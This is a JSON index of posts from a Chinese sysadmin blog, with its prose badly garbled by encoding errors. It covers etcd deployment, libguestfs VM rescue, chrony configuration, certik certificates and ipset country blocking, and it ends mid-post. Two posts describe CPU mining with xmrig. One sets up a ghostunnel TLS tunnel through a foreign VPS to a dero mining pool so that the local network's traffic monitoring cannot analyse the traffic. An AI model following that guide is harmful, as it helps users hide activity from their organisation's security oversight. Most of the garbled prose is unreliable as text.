NGINXçš„é…ç½®"},{"categories":null,"content":"ç”±äºä½¿ç”¨åˆ°äº†é˜¿é‡Œçš„ K8S æ‰˜ç®¡é›†ç¾¤ ACKï¼Œäºæ˜¯æƒ³å ä¾¿å®œã€‚æƒ³ç”¨åˆ°æ‰˜ç®¡ master node çš„ etcd æ¥ä¿å­˜æ•°æ®ã€‚\nç»“æœæ˜¯ï¼Œæœªé‚ï¼ï¼æ— æ³•ä½¿ç”¨ã€‚\né˜¿é‡Œæœ‰å•ç‹¬çš„é…ç½®ç®¡ç†æœåŠ¡ï¼Œå¤æ‚åŒ–äº†ï¼Œä¸æƒ³ç”¨ã€‚\né‚£ä¹ˆè§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œå¯åŠ¨åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹å‰¯æœ¬çš„ etcd podï¼Œç„¶åæ•°æ®æŒä¹…åŒ–åˆ° OSS çš„ S3 æ¡¶ä¸­ã€‚\nä¸€ã€å®ç°etcdçš„å•èŠ‚ç‚¹dockeråŒ– é¦–å…ˆæˆ‘ä»¬åªæƒ³åœ¨æµ‹è¯•ç¯å¢ƒä¸­è·‘ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcdï¼Œè¿˜æ²¡æœ‰ç”¨åˆ° k8sï¼Œåšæ³•å¦‚ä¸‹ï¼š\n1#!/bin/bash 2 3NODE1=172.18.31.33 4REGISTRY=quay.io/coreos/etcd 5# available from v3.2.5 6#REGISTRY=gcr.io/etcd-development/etcd 7 8docker run \\ 9 -p 2379:2379 \\ 10 -p 2380:2380 \\ 11 --volume=/data/etcd:/etcd-data \\ 12 --name etcd ${REGISTRY}:latest \\ 13 /usr/local/bin/etcd \\ 14 --data-dir=/etcd-data --name node1 \\ 15 --initial-advertise-peer-urls http://${NODE1}:2380 --listen-peer-urls http://0.0.0.0:2380 \\ 16 --advertise-client-urls http://${NODE1}:2379 --listen-client-urls http://0.0.0.0:2379 \\ 17 --initial-cluster node1=http://${NODE1}:2380 å¦‚ä¸Šå°±å¯ä»¥äº†ï¼Œå®¹å™¨è·‘èµ·æ¥ä»¥åè¿›å…¥å®¹å™¨æµ‹è¯•ä¸€ä¸‹ï¼š\n1docker exec -it 425f26903466 /bin/sh 2 3etcdctl -C http://127.0.0.1:2379 member list 4c3511611548b7c7c: name=node1 peerURLs=http://172.18.31.33:2380 clientURLs=http://172.18.31.33:2379 isLeader=true 5 6etcdctl ls --recursive / è¿™æ ·ä¸€ä¸ªå•èŠ‚ç‚¹çš„ etcd å°±å¼„å¥½äº†ï¼Œå¯¹å¤–æš´éœ²çš„æ˜¯ 2379 å’Œ 2380 ç«¯å£\näºŒã€å®ç° etcd çš„å•èŠ‚ç‚¹ k8s åŒ– é¦–å…ˆç¼–å†™ä¸€ä¸ªdeploymentæ–‡ä»¶etcd-deploy.yamlï¼š\nä¸‹è½½ï¼šetcd-deploy.yaml 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: etcd-deploy 5 labels: 6 app: etcd 7spec: 8 replicas: 1 9 selector: 10 matchLabels: 11 app: etcd 12 template: 13 metadata: 14 labels: 15 app: etcd 16 spec: 17 containers: 18 - name: etcd 19 image: quay.io/coreos/etcd:latest 20 ports: 21 - containerPort: 2379 22 name: client 23 protocol: TCP 24 - containerPort: 2380 25 name: server 26 protocol: TCP 27 command: 28 - /usr/local/bin/etcd 29 - --name 30 - etcd 31 - --initial-advertise-peer-urls 32 - http://etcd:2380 33 - --listen-peer-urls 34 - http://0.0.0.0:2380 35 - --listen-client-urls 36 - http://0.0.0.0:2379 37 - --advertise-client-urls 38 - http://etcd:2379 39 - --initial-cluster 40 - etcd=http://etcd:2380 41 - --data-dir 42 - /etcd-data 43 volumeMounts: 44 - mountPath: /etcd-data 45 name: etcd-data 46 lifecycle: 47 postStart: 48 exec: 49 command: 50 - \u0026#34;sh\u0026#34; 51 - \u0026#34;-c\u0026#34; 52 - \u0026gt; 53 echo \u0026#34;127.0.0.1 etcd\u0026#34; \u0026gt;\u0026gt; /etc/hosts; 54 volumes: 55 - name: etcd-data 56 persistentVolumeClaim: 57 claimName: k8s-etcd-20g 58 restartPolicy: Always æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ª pvc å· k8s-etcd-20gï¼Œè¿™ä¸ªå·æŒ‚åœ¨ /etcd-dataï¼Œæ˜¯ç”± OSS å»ºç«‹çš„ï¼Œç”¨äºæŒä¹…è¯æ•°æ®ï¼Œçœå¾—é‡å¯ etcd çš„ podï¼Œæ•°æ®æ¶ˆå¤±ä¸è§äº†ã€‚\nç„¶åï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ª deployment ä½œä¸º svc æœåŠ¡æš´éœ²åœ¨é›†ç¾¤ä¸­ï¼Œå†ç¼–å†™ä¸€ä¸ªetcd-svc.yaml\nä¸‹è½½ï¼šetcd-svc.yaml 1apiVersion: v1 2kind: Service 3metadata: 4 name: etcd-svc 5spec: 6 ports: 7 - port: 2379 8 name: tcp2379 9 protocol: TCP 10 targetPort: 2379 11 - port: 2380 12 name: tcp2380 13 protocol: TCP 14 targetPort: 2380 15 selector: 16 app: etcd 17 type: ClusterIP kubectl apply éƒ¨ç½²åˆ° k8s ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚\nk8sæµ‹è¯•æ–¹æ³•ï¼Œéšä¾¿å¯åŠ¨ä¸€ä¸ª busybox podï¼Œè¿›å»æµ‹è¯•ä¸€ä¸‹ï¼š\n1kubectl run curl --image=radial/busyboxplus:curl -i --tty --rm 2 3curl http://etcd-svc:2379/version 4 5curl http://etcd-svc.default:2379/version 6 7curl http://etcd-svc.default:2379/v2/keys 8 9curl http://etcd-svc.default:2379/v2/keys/?recursive=true 10 11curl http://etcd-svc.default:2379/v2/keys/service/nginx 12 13curl http://etcd-svc.default:2379/v2/keys/service/nginx/127.0.0.1 14 15curl --location --request PUT \u0026#39;http://etcd-svc:2379/v2/keys/service/nginx/10.240.0.41\u0026#39; --header \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; --data-urlencode \u0026#39;value=10.240.0.41:9000\u0026#39; 16 17curl http://etcd-svc.default:2379/v2/keys/service/nginx/ ","date":"2021-10-21","img":"","permalink":"https://rendoumi.com/posts/20211021-etcd_docker/","series":null,"tags":null,"title":"Etcdå•èŠ‚ç‚¹åº”ç”¨"},{"categories":null,"content":"åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æˆ‘ä»¬å¤§é‡ä½¿ç”¨äº† kvm çš„è™šæ‹ŸæŠ€æœ¯ï¼Œè™šæ‹Ÿæœºçš„é•œåƒç³»ç»Ÿä½¿ç”¨çš„æ˜¯ Cloud-init çš„æŠ€æœ¯\nä¸å¯é¿å…çš„ï¼Œè™šæœºä¼šé­åˆ°å„ç§æŸåï¼Œç»´æŠ¤çš„æ‰‹æ®µå°±ååˆ†å¿…è¦äº†\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè™šæœºæ–‡ä»¶ vis-16-41-18.qcow2 åäº†\nä¸€ã€å®‰è£…æ”¯æŒåŒ… 1yum install libguestfs libguestfs-tools äºŒã€æŸ¥çœ‹æ—¥å¿— 1virt-log -a vis-16-41-18.qcow2 æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æŠ¥é”™ä¿¡æ¯\nä¸‰ã€åˆ†ææ–‡ä»¶ç³»ç»Ÿç»„æˆ virt-filesystemså’Œvirt-dféƒ½å¯ä»¥ï¼Œç”¨virt-dfçœ‹çš„æ›´å¤šä¸€äº›\n1virt-filesystems -l -a vis-16-41-18.qcow2 2Name Type VFS Label Size Parent 3/dev/sda1 filesystem ext4 - 209715200 - 4/dev/sda2 filesystem ext4 - 214536355840 - 5 6virt-df -a vis-16-41-18.qcow2 7Filesystem 1K-blocks Used Available Use% 8vis-16-41-18.qcow2:/dev/sda1 194241 31706 152295 17% 9vis-16-41-18.qcow2:/dev/sda2 206088704 5639856 189973444 3% å››ã€æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤ï¼ˆæ–¹æ³•1ï¼‰ ä»ä¸Šé¢å¯ä»¥çœ‹åˆ° vis-16-41-18.qcow2 é‡Œé¢æœ‰ä¸¤ä¸ªåˆ†åŒºï¼Œ/dev/sda1 å’Œ/dev/sda2\nç¬¬ä¸€ä¸ªåº”è¯¥æ˜¯/bootï¼Œç¬¬äºŒä¸ªæ˜¯/\næŠŠ / mount å‡ºæ¥\n1mkdir 18 2guestmount -a vis-16-41-18.qcow2 -m /dev/sda2 --rw ./18 æˆ–è€…å…¨è‡ªåŠ¨mount\n1guestmount -a vis-16-41-18.qcow2 -i --rw ./18 è¿™æ ·å°±å¯ä»¥ç›´æ¥è¿›18ç›®å½•è¿›è¡Œä¿®å¤æ“ä½œäº†\n1cd 18/lib64 2ls libc*.* å‘ç°åŒäº‹èƒ¡ä¹±å‡çº§glibcï¼ŒæŠŠlibcçš„åŸºç¡€åº“å¼„åäº†ï¼Œå°‘libc.so.6çš„è½¯é“¾æ¥ï¼Œå»ºç«‹ä¸€ä¸ªä¿®å¤å³å¯\n1ln -s libc-2.15.so libc.so.6 äº”ã€æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤ï¼ˆæ–¹æ³•2ï¼‰ æˆ‘ä»¬å¯ä»¥ç”¨ guestmountï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ guestfish ã€‚\nguestfish æ˜¯ä¸ªå‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒä½¿ç”¨ libguestfs çš„æ‰€æœ‰åŠŸèƒ½ã€‚\n1guestfish 2 3Welcome to guestfish, the libguestfs filesystem interactive shell for 4editing virtual machine filesystems. 5 6Type: \u0026#39;help\u0026#39; for help on commands 7 \u0026#39;man\u0026#39; to read the manual 8 \u0026#39;quit\u0026#39; to quit the shell 9 10\u0026gt;\u0026lt;fs\u0026gt; add vis-16-41-18.qcow2 11\u0026gt;\u0026lt;fs\u0026gt; run 12\u0026gt;\u0026lt;fs\u0026gt; list-filesystems 13/dev/sda1: ext4 14/dev/sda2: ext4 15\u0026gt;\u0026lt;fs\u0026gt; mount /dev/sda2 / 16\u0026gt;\u0026lt;fs\u0026gt; cat /etc/fstab 17 18# 19# /etc/fstab 20# Created by anaconda on Mon Dec 29 15:24:53 2014 21# 22# Accessible filesystems, by reference, are maintained under \u0026#39;/dev/disk\u0026#39; 23# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info 24# 25UUID=9fdc111c-3042-4527-b3f8-a2961e55077e / ext4 defaults 1 1 26UUID=1855d5e1-18f8-48ea-8c3b-c52cdd512a5e /boot ext4 defaults 1 2 27tmpfs /dev/shm tmpfs defaults 0 0 28devpts /dev/pts devpts gid=5,mode=620 0 0 29sysfs /sys sysfs defaults 0 0 30proc /proc proc defaults 0 0 31 32\u0026gt;\u0026lt;fs\u0026gt; guestfishçš„å¸¸ç”¨å‘½ä»¤ï¼š\n1add vis-16-41-18.qcow2 2run 3list-filesystems 4 5ll / 6ls / 7cat /etc/fstab 8write-append /etc/rc.d/rc.local \u0026#34;service sshd start\u0026#34; 9edit /etc/fstab. 10less /var/log/messages 11mkdir /tmp/a 12touch /tmp/a/b.txt 13write /tmp/a/b.txt 14rm /tmp/a/b.txt 15 16upload Upload a local file to the disk. ###æ³¨æ„ï¼šæ˜¯ä¸Šè½½æœ¬åœ°æ–‡ä»¶åˆ°é•œåƒæ–‡ä»¶å»ï¼ï¼ï¼ å…­ã€virtå¯¹åº”guestfishçš„ä¸€äº›å‘½ä»¤ 1virt-cat vis-16-41-18.qcow2 /home/supdev/.bash_history 2 3virt-copy-in Copy files and directories into a guest. 4virt-copy-out Copy files and directories out of a guest. 5 6virt-edit Edit a file in a guest. 7virt-ls List files and directories in a guest ä¸ƒã€virt-rescueæ•‘æ´æ¨¡å¼ å¦‚æœè™šæœºç³»ç»Ÿèµ·ä¸æ¥ï¼Œå¯ä»¥å…ˆå°è¯•è¿›å…¥ rescue æ•‘æ´æ¨¡å¼\nvirt-rescue ç±»ä¼¼äºæ•‘æ´ CDï¼Œä½†ç”¨äºè™šæ‹Ÿæœºï¼Œä¸”æ— éœ€æä¾› CDã€‚\nvirt-rescue ä¸ºç”¨æˆ·æä¾›æ•‘æ´å¤–å£³å’Œä¸€äº›ç®€å•çš„æ¢å¤å·¥å…·ï¼Œå¯ç”¨äºæ£€æŸ¥å’Œæ›´æ­£è™šæ‹Ÿæœºæˆ–ç£ç›˜æ˜ åƒä¸­çš„é—®é¢˜ã€‚\n1virt-rescue -a vis-16-41-18.qcow2 2Welcome to virt-rescue, the libguestfs rescue shell. 3 4Note: The contents of / are the rescue appliance. 5You need to mount the guest\u0026#39;s partitions under /sysroot 6before you can examine them. A helper script for that exists: 7mount-rootfs-and-do-chroot.sh /dev/sda2 8 9\u0026gt;\u0026lt;rescue\u0026gt; 10[ 67.194384] EXT4-fs (sda1): mounting ext3 file system 11using the ext4 subsystem 12[ 67.199292] EXT4-fs (sda1): mounted filesystem with ordered data 13mode. Opts: (null) 14mount: /dev/sda1 mounted on /sysroot. 15mount: /dev bound on /sysroot/dev. 16mount: /dev/pts bound on /sysroot/dev/pts. 17mount: /proc bound on /sysroot/proc. 18mount: /sys bound on /sysroot/sys. 19Directory: /root 20Thu Jun 5 13:20:51 UTC 2014 21(none):~ # ","date":"2021-10-21","img":"","permalink":"https://rendoumi.com/posts/20211021-libguestfs/","series":null,"tags":null,"title":"Libguestfsçš„æ•‘æ´æ‰‹æ®µ"},{"categories":null,"content":"è¿™æ˜¯ä¸ªå¨±ä¹è¯é¢˜ï¼ŒDogecoin ç‹—å¸åœ¨é©¬æ–¯å…‹çš„å¹æ§é¼“åŠ¨ä¸‹ï¼Œå†²ä¸Šäº‘éœ„\nå…¶å®çœŸçš„ç”¨CPUæŒ–å¸ï¼Œåº”è¯¥æ˜¯æŒ– xmb é—¨ç½—å¸æ‰æ˜¯å¯¹çš„é€‰æ‹©ï¼ŒæŒ–ç‹—å¸åªæ˜¯å¨±ä¹ä¸€ä¸‹\nåºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸Šæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS\né¦–å…ˆéœ€è¦æœ‰ä¸ªç‹—å¸é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†\nä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶ ä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases\næˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½\näºŒã€åšå¥½åŠ å¯†é€šé“ æˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“\nç”¨ ghostunnel, localhost:9999 \u0026mdash;\u0026gt; vps:9999 \u0026mdash;\u0026gt; rx.unmineable.com:3333\nä¸‰ã€ç”¨screenåå°å¼€æŒ– 1screen 2 3#./xmrig -o localhost:9999 -a rx -k -u DOGE:ç‹—å¸åœ°å€.çŸ¿å·¥å#heyt-3711 4./xmrig -o localhost:9999 -a rx -k -u DOGE:DLR3DZGucJiSdahARW1vV5B1h3WYiw454a.work01 5 6ctrl+a+d å››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘ æŸ¥çœ‹åœ°å€ï¼šhttps://unmineable.com/coins/DOGE/address/\n","date":"2021-10-21","img":"","permalink":"https://rendoumi.com/posts/20211021-dogecoin/","series":null,"tags":null,"title":"å¦‚ä½•ç”¨CPUæŒ–ç‹—å¸Dogecoin"},{"categories":null,"content":"chrony å·²ç»æˆäº†äº‹å®æ ‡å‡†ï¼Œæ›¿ä»£äº†ntpã€‚\nä½†æ˜¯ï¼Œæœ‰å‡ ä¸ªç»†èŠ‚ï¼Œéœ€è¦éå¸¸æ³¨æ„ã€‚\nç»™å‡ºæˆ‘ä»¬çš„é…ç½®ï¼Œ/etc/chrony.conf\n1 2# Use public servers from the pool.ntp.org project. 3# Please consider joining the pool (http://www.pool.ntp.org/join.html). 4server 172.10.1.1 iburst prefer minpoll 6 maxpoll 10 5server 172.10.1.2 iburst 6 7# Record the rate at which the system clock gains/losses time. 8driftfile /var/lib/chrony/drift 9 10# Allow the system clock to be stepped in the first three updates 11# if its offset is larger than 1 second. 12makestep 1.0 3 13 14# Enable kernel synchronization of the real-time clock (RTC). 15rtcsync 16 17# Enable hardware timestamping on all interfaces that support it. 18#hwtimestamp * 19 20# Increase the minimum number of selectable sources required to adjust 21# the system clock. 22#minsources 2 23 24# Allow NTP client access from local network. 25#allow 192.168.0.0/16 26 27# Serve time even if not synchronized to a time source. 28#local stratum 10 29 30# Specify file containing keys for NTP authentication. 31#keyfile /etc/chrony.keys 32 33# Specify directory for log files. 34logdir /var/log/chrony 35logchange 0.5 36# Select which information is logged. 37#log measurements statistics tracking rtc é‡Œé¢æœ‰å¥½å‡ ä¸ªç»†èŠ‚ï¼Œä¸‹é¢é€ä¸€è§£é‡Šä¸€ä¸‹ï¼š\nä¸€ã€server è¿™é‡Œå¯ä»¥æ·»åŠ å¾ˆå¤šæ—¶é—´æœåŠ¡å™¨ï¼Œ172.10.1.1 å’Œ 172.10.1.2 æ˜¯ä¸¤å°è‡ªå»ºçš„æ—¶é—´æœåŠ¡å™¨ã€‚\nibust ä¼šåœ¨ chrony å¯åŠ¨çš„2ç§’å†…ï¼Œå»å¿«é€ŸpollæœåŠ¡å™¨4æ¬¡æ¥å¿«é€ŸçŸ«æ­£å½“å‰ç³»ç»Ÿæ—¶é—´\nprefer ä¼˜å…ˆä½¿ç”¨æŒ‡å®šçš„æœåŠ¡å™¨\nminpoll 6ï¼Œç¼ºçœæ˜¯6ï¼Œæ„æ€æ˜¯2çš„6æ¬¡æ–¹ï¼Œä¹Ÿå°±æ˜¯64ç§’ï¼Œæœ€å°è½®è¯¢æ—¶é—´æœåŠ¡å™¨çš„æ—¶é—´é—´éš”æ˜¯64ç§’\nmaxpoll 10ï¼Œç¼ºçœæ˜¯10ï¼ŒåŒä¸Šï¼Œ2çš„10æ¬¡æ–¹ï¼Œä¹Ÿå°±æ˜¯1024ç§’ï¼Œæœ€å¤§è½®è¯¢æ—¶é—´é—´éš”æ˜¯1024ç§’\né€šå¸¸æƒ…å†µä¸‹ä¸€è¿‡minpollçš„æ—¶é—´å‘¨æœŸï¼Œå°±ä¼šè§¦å‘ä¸€æ¬¡æ—¶é—´åŒæ­¥è¯¢é—®ã€‚\näºŒã€makestep æ­£å¸¸æƒ…å†µä¸‹å¦‚æœç³»ç»Ÿæ—¶é’Ÿè·Ÿæ—¶é—´æœåŠ¡å™¨ä¸ä¸€è‡´ï¼Œchronyè°ƒæ•´çš„æ–¹å¼æ˜¯æ…¢æ…¢å¢åŠ ï¼Œæˆ–æ…¢æ…¢å‡å°‘ï¼Œä¸ä¼šä¸€æ­¥åˆ°ä½ï¼Œç›´æ¥å»è·Ÿæ—¶é—´æœåŠ¡å™¨å¯¹é½ã€‚\nmakestep 1.0 3ï¼Œæ„æ€å°±æ˜¯å¦‚æœæ—¶é—´æœåŠ¡å™¨è·Ÿç³»ç»Ÿæ—¶é—´ç›¸å·®1ç§’ï¼Œé‚£ä¹ˆå°±åœ¨ä¸‹3ä¸ªæ—¶é’Ÿæ›´æ–°ä¸­è¿½ä¸Šæ—¶é—´æœåŠ¡å™¨ã€‚\nè¿™æ ·å°±ä¼šç«‹åˆ»å¿«é€Ÿè¿½å¹³äº†ï¼Œè¿™æ ·ä¼šå¸¦æ¥æ—¶é—´è·³è·ƒã€‚\nä¸‰ã€rtcsync è¿™ä¸ªæ˜¯æŠŠç³»ç»Ÿæ—¶é’ŸåŒæ­¥åˆ°ä¸»æ¿çš„ç¡¬ä»¶æ—¶é’Ÿå»ã€‚\nç¼ºçœæƒ…å†µä¸‹æ˜¯11åˆ†é’ŸåŒæ­¥ä¸€æ¬¡\nå››ã€logchange logchange 0.5ï¼Œæ„æ€æ˜¯å¦‚æœchronyè°ƒæ•´çš„ç³»ç»Ÿæ—¶é—´ï¼Œè¶…è¿‡äº†0.5ç§’çš„æ—¶é•¿ï¼Œå°±ä¼šå‘ä¸€æ¡æ¶ˆæ¯åˆ°syslogï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½åœ¨/var/log/messagesé‡Œçœ‹åˆ°è¿™æ¡æ¶ˆæ¯äº†ã€‚\näº”ã€éªŒè¯è°ƒè¯• å¼€å‘äººå‘˜ä¼šé—®ï¼Œä»€ä¹ˆæ—¶å€™åŒæ­¥çš„æœåŠ¡å™¨å•Šï¼Œå¤šé•¿æ—¶é—´åŒæ­¥ä¸€æ¬¡ï¼Œæ—¶é—´åˆ°åº•å‡†ä¸å‡†å•Šï¼Œæœ‰æ²¡æœ‰å‘ç”Ÿè·³è·ƒå•Š\næˆ‘ä»¬å°±ç”¨chronyc sourcesæ¥éªŒè¯ï¼Œé…ç½®ä¸­\n1server 172.10.1.1 iburst prefer minpoll 4 maxpoll 5 2server 172.10.1.2 iburst è§£é‡Šä¸€ä¸‹ï¼Œminpoll 4 maxpoll 5 ï¼Œé‚£ä¹ˆæœ€å°è½®è¯¢æ—¶é—´16ç§’ï¼Œæœ€å¤§32ç§’ã€‚\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šå›¾ LastRx å°±æ˜¯ä¸Šæ¬¡è¯¢é—®æ—¶é—´æœåŠ¡å™¨çš„é—´éš”æ—¶é—´ï¼Œ14ç§’ã€15ç§’ã€16ç§’ï¼Œç„¶åå°±å˜1äº†ï¼Œæœ€å°é—´éš”16ç§’åï¼Œç«‹å³å°±è¯¢é—®æ—¶é—´æœåŠ¡å™¨ï¼ŒåŒæ­¥æ—¶é—´ã€‚\nåŒæ ·å¯ä»¥çœ‹åˆ°ç¬¬äºŒå°æ—¶é—´æœåŠ¡å™¨å°±ä¸å—è¿™ä¸ªé™åˆ¶ï¼Œç¼ºçœminpoll 6ï¼Œå°±æ˜¯64ç§’ã€‚æ‰€ä»¥ä¸Šå›¾ç¬¬äºŒå°ï¼Œ63ç§’ã€64ç§’ã€65ç§’ï¼Œå˜0ï¼Œæ‰å»è¯¢é—®æ—¶é—´æœåŠ¡å™¨ã€‚\næ€»ç»“ä¸€ä¸‹ï¼Œchrony è°ƒæ•´æ—¶é—´åå·®æ˜¯åŒ€é€Ÿçš„ï¼Œç¼“æ…¢çš„ã€‚å®ƒè¯¢é—®æ—¶é—´æœåŠ¡å™¨çš„é—´éš”ç”±minpollæ¥æ§åˆ¶ã€‚\næˆ‘ä»¬ç”¨logchangeæ¥è®°å½•å¤§çš„æ—¶é—´è°ƒæ•´ï¼Œä»¥å¤‡è¿½æº¯å’ŒæŸ¥è¯¢ã€‚\n","date":"2021-10-20","img":"","permalink":"https://rendoumi.com/posts/20211020-chrony/","series":null,"tags":null,"title":"Chronyçš„å‡ ä¸ªè¯¦ç»†é…ç½®ç»†èŠ‚"},{"categories":null,"content":"å¾ˆç°å®çš„é—®é¢˜ï¼Œå±€åŸŸç½‘å†…æœ‰æ€åŠ¿æ„ŸçŸ¥å’Œç½‘ç»œæµé‡åˆ†æï¼Œè¿™å¾ˆè®¨åŒï¼\né‚£ä¹ˆï¼Œå¦‚ä½•æŠŠæŸæ®µæµé‡éšè—èµ·æ¥ï¼Œè®©æ€åŠ¿æ„ŸçŸ¥æ— æ³•åˆ†æå‘¢ï¼Ÿ\nå‰ææ¡ä»¶ï¼Œä½ éœ€è¦æœ‰å›½å¤–çš„ä¸€å° VPS ä½œä¸ºå¤–æ´ï¼ŒæŠŠ TCP æµé‡é€šè¿‡ TLS åŠ å¯†é€åˆ°å›½å¤–çš„æœåŠ¡å™¨ï¼Œç„¶åå†è½¬å‘åˆ°æ­£ç¡®çš„ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å°±ä¸ä¼šè¢«äººè¿½è¸ªäº†ã€‚\nè¿™é‡Œæ¨è Ghostunnel ï¼Œè¿™æ˜¯ä¸ª Go çš„ç¨‹åºï¼Œåªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ã€‚é…åˆ certik è¯ä¹¦ç”Ÿæˆï¼Œå°±å®Œç¾äº†ã€‚\né¡¹ç›®åœ°å€ï¼šhttps://github.com/ghostunnel/ghostunnel\né¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ certik ç”Ÿæˆä¸‰ä¸ªè¯ä¹¦ï¼Œca.pem server.pem å’Œ client1.pem\nç„¶åghostunnelä»¥åŠä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶éƒ½æ”¾åœ¨/usr/local/binä¸‹\nä¸€ã€åœ¨VPSä¸Šè¿è¡Œghostunnelæ¨¡å¼server 1/usr/local/bin/ghostunnel server --listen 0.0.0.0:9999 --target tr.dero.herominers.com:1117 --keystore server.pem --cacert ca.pem --allow-cn client1 --unsafe-target ä¸Šé¢ç›‘å¬äº†ç«¯å£0.0.0.0:9999ï¼ˆç›‘å¬0.0.0.0å¿…é¡»åŠ å‚æ•°\u0026ndash;unsafe-targetï¼‰ï¼Œè¿œç¨‹è½¬å‘åˆ°deroçš„çŸ¿æ± ç«¯å£1117ï¼Œåªå…è®¸éªŒè¯è¿‡çš„cn client1è¿æ¥ã€‚\näºŒã€åœ¨æœ¬åœ°æœºå™¨ä¸Šè¿è¡Œghostunnelæ¨¡å¼client 1/usr/local/bin/ghostunnel client --listen localhost:9999 --target 193.42.114.129:9999 --keystore client.pem --cacert ca.pem æœ¬åœ°ç›‘å¬localhost:9999ï¼Œæ‰€ä»¥ä¸ç”¨åŠ \u0026ndash;unsafe-targetå‚æ•°ï¼Œç„¶åè¿æ¥åˆ°è¿œç¨‹ vps æœåŠ¡å™¨ï¼Œipåœ°å€æ˜¯193.42.114.129ï¼Œç«¯å£æ˜¯9999\nè¿™æ ·å°±å®Œæˆäº†ã€‚å¯ä»¥æ”¾å¿ƒçš„å¯åŠ¨ç¨‹åºï¼Œè¿æ¥åˆ°æœ¬åœ°ç«¯å£localhost:9999ï¼ŒTCPæµé‡å°±ä¼šè¢«éšè—èµ·æ¥ï¼Œä¸ä¼šè¢«åˆ†æåˆ°.\n","date":"2021-10-19","img":"","permalink":"https://rendoumi.com/posts/20211019-ghostunnel/","series":null,"tags":null,"title":"Ghostunnelä½¿ç”¨TLSåŠ å¯†TCPæµé‡"},{"categories":null,"content":"æˆ‘ä»¬ä¼šæœ‰å¾ˆå¤šæ—¶å€™éœ€è¦ç”¨åˆ°TLSè¯ä¹¦ï¼Œä¸€ä¸ªéå¸¸æ–¹ä¾¿ã€å°ä¼—çš„å·¥å…·å°±æ˜¯ certik ã€‚\nè¿™ä¸ªè½¯ä»¶çº¯ç”± Go ç»„æˆï¼Œå°±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨äº† etcd çš„ boltdb æ ¼å¼å­˜æ”¾æ‰€æœ‰çš„è¯ä¹¦ã€‚\nè½¯ä»¶åœ°å€ï¼šhttps://github.com/opencoff/certik\nä½¿ç”¨ï¼š\nä¸€ã€åˆå§‹åŒ–è¯ä¹¦åº“ 1./certik -v tls.db init CA äºŒã€ç­¾å‘ä¸€å¼ serverè¯ä¹¦ 1#./certik -v tls.db server -i IP.ADDR.ES server.domain.name 2./certik -v tls.db server -i 193.42.114.129 server ä¸Šé¢æˆ‘ä»¬ server çš„ ip æ˜¯193.42.114.129ï¼ŒåŸŸåç®€æ´èµ·è§å°±å« server äº† ã€‚\nä¸‰ã€ç­¾å‘ä¸€å¼ client1è¯ä¹¦ 1./certik -v tls.db client client1 å››ã€æŸ¥çœ‹è¯ä¹¦åº“ 1./certik -v tls.db list æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¯ä¹¦äº†ï¼Œä¸€ä¸ª CA ï¼Œä¸€ä¸ª server ï¼Œä¸€ä¸ª client1\näº”ã€å¯¼å‡ºå„ä¸ªè¯ä¹¦ 1#å¯¼å‡ºCA 2./certik -v tls.db export --root-ca 3 4#å¯¼å‡ºserver 5./certik -v tls.db export server 6 7#å¯¼å‡ºclient1 8./certik -v tls.db export client1 ä»¥ä¸Šå°±å¯ä»¥å¾—åˆ°å„ä¸ªä¸œè¥¿äº†ã€‚\né‚£ä¹ˆæˆ‘ä»¬ gen å‡ºè¯ä¹¦åšä»€ä¹ˆç”¨å‘¢ï¼Ÿå½“ç„¶ç”¨ä½œ ghostunnel çš„éªŒè¯ç”¨\n","date":"2021-10-19","img":"","permalink":"https://rendoumi.com/posts/20211019-certik/","series":null,"tags":null,"title":"Certik è¯ä¹¦ç­¾å‘è½¯ä»¶"},{"categories":null,"content":"ç°åœ¨å›½å†…éƒ½ç¦æ­¢æŒ–å¸ï¼Œä»€ä¹ˆå¸å®‰ã€ç«å¸ã€cnsparkä¹‹ç±»çš„éƒ½ä¸å…è®¸å›½å†… IP è®¿é—®äº†ã€‚\nå¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ\né¦–å…ˆéœ€è¦å¾—åˆ°å›½å®¶IPæ®µï¼Œä¸‹è½½åœ°å€ï¼šhttp://www.ipdeny.com/ipblocks/ã€‚è¿™é‡Œä»¥æˆ‘ä»¬å›½å®¶ cn ä¸ºä¾‹\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…ipset 1#Debian/Ubuntuç³»ç»Ÿ 2apt-get -y install ipset 3 4#CentOSç³»ç»Ÿ 5yum -y install ipset 